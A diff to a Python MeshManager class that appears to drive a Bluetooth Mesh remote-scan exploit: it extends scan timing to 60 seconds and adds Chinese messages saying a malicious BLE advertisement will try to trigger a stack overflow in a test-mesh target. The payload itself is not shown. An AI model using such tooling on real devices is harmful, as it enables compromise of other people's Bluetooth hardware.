@@ -148,8 +148,12 @@ class MeshManager:
                 print(f" [发现远端设备] UUID: {uid_hex} | RSSI: {rssi}dBm")
 
         self.stack.rp_client.on_scan_report = on_remote_report
-        opcode, payload = self.stack.rp_client.scan_start(timeout=10)
+        opcode, payload = self.stack.rp_client.scan_start(timeout=60)
         await self.stack.send_model_message(self.target_addr, self.stack.rp_client, opcode, payload)
+        
+        print("\n[!] 远程扫描将持续 60 秒。在此期间，请让目标设备（Pi1 附近）")
+        print("[!] 发送 BLE 广播（手机开蓝牙、或其他蓝牙设备靠近）。")
+        print("[!] 当 test-mesh 收到广播后，会尝试触发栈溢出漏洞...")
         
         # 直接通过 Bumble HCI 发送恶意广播，不依赖 hcitool
         print("\n[!] 正在通过 Bumble HCI 发送恶意 BLE 广播...")
@@ -271,7 +275,7 @@ class MeshManager:
             import traceback
             traceback.print_exc()
         
-        await asyncio.sleep(10.0)
+        await asyncio.sleep(60.0)
         print("\n远程扫描结束。")
 
     async def remote_provision_flow(self):
